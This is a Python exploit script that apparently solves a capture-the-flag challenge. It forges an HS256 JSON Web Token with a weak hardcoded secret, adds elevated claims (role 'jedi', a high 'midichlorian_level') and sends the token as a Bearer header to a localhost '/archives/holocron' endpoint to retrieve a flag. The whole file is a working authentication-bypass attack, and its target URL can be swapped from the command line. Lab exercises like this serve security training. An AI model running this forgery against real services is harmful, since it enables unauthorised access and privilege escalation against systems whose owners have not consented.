import jwt
import requests
import sys

# Configuration
TARGET_URL = "http://localhost:3000"
SECRET_KEY = "whatever"

def get_flag():
    # 1. Construct the malicious payload
    payload = {
        "sub": "hacker",
        "role": "jedi",
        "midichlorian_level": 20000, # Must be > 15000
    }

    # 2. Sign the token using the secret key
    print(f"[*] Forging JWT with secret: '{SECRET_KEY}'...")
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    
    print(f"[*] Forged Token: {token}")

    # 3. Send the request to the restricted endpoint
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    print(f"[*] Sending request to {TARGET_URL}/archives/holocron...")
    try:
        r = requests.get(f"{TARGET_URL}/archives/holocron", headers=headers)
        
        if r.status_code == 200:
            print(f"\n[+] SUCCESS! Flag: {r.json().get('flag')}")
        else:
            print(f"[-] Failed. Status: {r.status_code}")
            print(f"[-] Response: {r.text}")
            
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        print("    (Ensure the challenge server is running on port 3000)")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    get_flag()
